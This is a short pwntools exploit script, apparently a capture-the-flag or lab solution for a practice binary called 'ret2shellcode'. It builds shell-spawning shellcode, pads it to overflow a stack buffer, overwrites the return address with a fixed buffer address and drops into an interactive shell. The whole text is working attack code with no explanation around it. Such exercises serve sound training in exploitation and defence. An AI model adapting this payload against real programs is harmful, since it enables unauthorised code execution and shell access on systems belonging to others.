from pwn import *

io = process('./ret2shellcode')

buf2 = 0x0804A080
shell = asm(shellcraft.sh())
payload = shell.ljust(112,b'a')+p32(buf2)

io.sendline(payload)
io.interactive()